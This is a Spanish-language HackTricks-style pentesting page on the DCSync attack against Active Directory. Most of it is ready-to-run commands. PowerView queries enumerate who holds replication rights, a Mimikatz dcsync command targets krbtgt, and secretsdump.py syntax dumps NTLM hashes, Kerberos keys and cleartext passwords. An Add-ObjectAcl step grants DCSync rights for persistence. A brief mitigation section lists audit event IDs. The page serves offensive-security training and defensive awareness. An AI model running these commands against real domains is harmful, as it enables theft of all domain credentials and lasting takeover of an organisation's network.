# DCSync

{{#include ../../banners/hacktricks-training.md}}

## DCSync

El permiso **DCSync** implica tener estos permisos sobre el dominio: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** y **Replicating Directory Changes In Filtered Set**.

**Notas Importantes sobre DCSync:**

- El **ataque DCSync simula el comportamiento de un Controlador de Dominio y solicita a otros Controladores de Dominio que repliquen información** utilizando el Protocolo Remoto de Servicio de Replicación de Directorios (MS-DRSR). Debido a que MS-DRSR es una función válida y necesaria de Active Directory, no se puede desactivar ni deshabilitar.
- Por defecto, solo los grupos **Domain Admins, Enterprise Admins, Administrators y Domain Controllers** tienen los privilegios requeridos.
- Si alguna contraseña de cuenta se almacena con cifrado reversible, hay una opción disponible en Mimikatz para devolver la contraseña en texto claro.

### Enumeración

Verifica quién tiene estos permisos usando `powerview`:
```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```
### Explotar Localmente
```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```
### Explotar Remotamente
```powershell
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-pwd-last-set] #To see when each account's password was last changed
[-history] #To dump password history, may be helpful for offline password cracking
```
`-just-dc` genera 3 archivos:

- uno con los **hashes NTLM**
- uno con las **claves Kerberos**
- uno con contraseñas en texto claro del NTDS para cualquier cuenta configurada con [**cifrado reversible**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) habilitado. Puedes obtener usuarios con cifrado reversible con

```powershell
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

### Persistencia

Si eres un administrador de dominio, puedes otorgar estos permisos a cualquier usuario con la ayuda de `powerview`:
```powershell
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```
Luego, puedes **verificar si al usuario se le asignaron correctamente** los 3 privilegios buscándolos en la salida de (deberías poder ver los nombres de los privilegios dentro del campo "ObjectType"):
```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```
### Mitigación

- Security Event ID 4662 (Audit Policy for object must be enabled) – Se realizó una operación en un objeto
- Security Event ID 5136 (Audit Policy for object must be enabled) – Se modificó un objeto del servicio de directorio
- Security Event ID 4670 (Audit Policy for object must be enabled) – Se cambiaron los permisos en un objeto
- AD ACL Scanner - Crear y comparar informes de ACLs. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## Referencias

- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
- [https://yojimbosecurity.ninja/dcsync/](https://yojimbosecurity.ninja/dcsync/)

{{#include ../../banners/hacktricks-training.md}}
